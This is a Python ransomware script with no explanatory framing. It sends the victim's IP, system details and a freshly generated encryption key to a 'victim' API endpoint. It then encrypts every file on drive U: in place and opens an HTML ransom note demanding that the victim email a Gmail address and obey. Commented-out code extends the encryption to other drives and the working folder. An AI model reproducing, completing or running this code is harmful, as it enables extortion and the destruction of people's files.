import json
import os
import webbrowser   
from cryptography.fernet import Fernet
from win32api import GetLogicalDriveStrings
from threading import Thread
import requests
import socket
import platform

KEY = Fernet.generate_key()
API_URL = "http://127.0.0.1:8000/victim/"




data = {
    "ip": socket.gethostbyname(socket.gethostname()),
    "key": KEY,
    "sys_information": str(platform.uname())
}

try:
    res = requests.post(API_URL, data=data)
    os.makedirs("R")
    with open("R/data.json", "w") as file_data:
        file_data.write(res.text)
except Exception:
    with open("R/data.json", "w") as file_data:
        data = {
            "key": KEY.decode()
        }
        file_data.write(json.dumps(data))

fernet = Fernet(KEY)

def encrypt(file):
    try: 
        with open(file, "rb") as myFile:
            myFileData = myFile.read()
        
        encryptedMyFileData = fernet.encrypt(myFileData)

        with open(file, "wb") as myFile:
            myFile.write(encryptedMyFileData)
        # print(file, ", encrypted")
    except Exception as e:
        return


 
def run():   
    for root, folders, files in os.walk("U:\\"):
        for file in files:
            encrypt(os.path.join(root, file))

    html_template = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <h1>You files are locked.</h1>
            <h2>Email at <a href="mailto:jimamtamimi12@gmail.com">jimamtamimi12@gmail.com</a> and do what ever i say, or you will never be able to unlock your files</h2>
            
            <img src="https://media.istockphoto.com/vectors/making-a-face-emoticon-vector-id642166578?k=20&m=642166578&s=612x612&w=0&h=I3qwFa8eWDQZCNpR24AlZsXj_cfx3RggzmNOczW2NFk=" alt="">
    
        </body>
        </html>
    """
    
    with open("msg.html", "w") as msg:
        msg.write(html_template)

    webbrowser.open("msg.html")
    

Thread(target=run).start()
    









# drives = GetLogicalDriveStrings().split("\x00")
# drives.pop()

# for drive in drives:
#     if(drive == "C:\\"):
#         continue
#     for root, folders, files in os.walk(drive):
#         for file in files:
#             encrypt(os.path.join(root, file))
 
 
 
 
# for file in os.listdir():
#     if file in ['encrypt.py', 'key_file.key', "decrypt.py"]:
#         continue
#     elif os.path.isfile(file):
#         encrypt(file)
      
      
      